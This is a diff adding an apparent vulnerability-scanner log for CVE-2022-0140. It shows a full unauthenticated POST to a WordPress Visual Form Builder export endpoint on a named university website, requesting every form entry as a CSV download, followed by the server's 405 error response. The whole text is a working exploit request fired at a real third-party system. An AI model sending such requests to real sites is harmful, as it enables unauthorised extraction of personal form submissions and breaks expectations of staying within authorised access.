@@ -1,0 +1,49 @@
+[CVE-2022-0140] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-admin/admin.php?page=vfb-export
+
+
+POST /wp-admin/admin.php?page=vfb-export HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 116
+Content-Type: application/x-www-form-urlencoded
+Origin: https://www.tbwl.esrc.unimelb.edu.au
+Referer: https://www.tbwl.esrc.unimelb.edu.au/wp-admin/admin.php?page=vfb-export
+Accept-Encoding: gzip
+
+vfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File
+[CVE-2022-0140] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-admin/admin.php?page=vfb-export
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 422
+Access-Control-Allow-Methods: PUT, POST
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: ETag
+Access-Control-Max-Age: 3000
+Allow: GET, HEAD, OPTIONS
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:19:00 GMT
+Server: AmazonS3
+Vary: Origin, Access-Control-Request-Headers, Access-Control-Request-Method
+Via: 1.1 3c6bb832c5323be7cf066aba5d1e22ea.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: BVemL9St7aaMwTquFGLrNp75FOb5H27dPzkHauIDLirhwYos1V0lUA==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>405 Method Not Allowed</title></head>
+<body>
+<h1>405 Method Not Allowed</h1>
+<ul>
+<li>Code: MethodNotAllowed</li>
+<li>Message: The specified method is not allowed against this resource.</li>
+<li>Method: POST</li>
+<li>ResourceType: OBJECT</li>
+<li>RequestId: X4BFZXDYY9PNSAHS</li>
+<li>HostId: iLgkDHzkO1QAAC/ucW+ImBdDS4ZMQvg4cvkP7amBErSpBr4nhBtvEP8LAXdwIAnf0LpLV0cQq3Q=</li>
+</ul>
+<hr/>
+</body>
+</html>
+
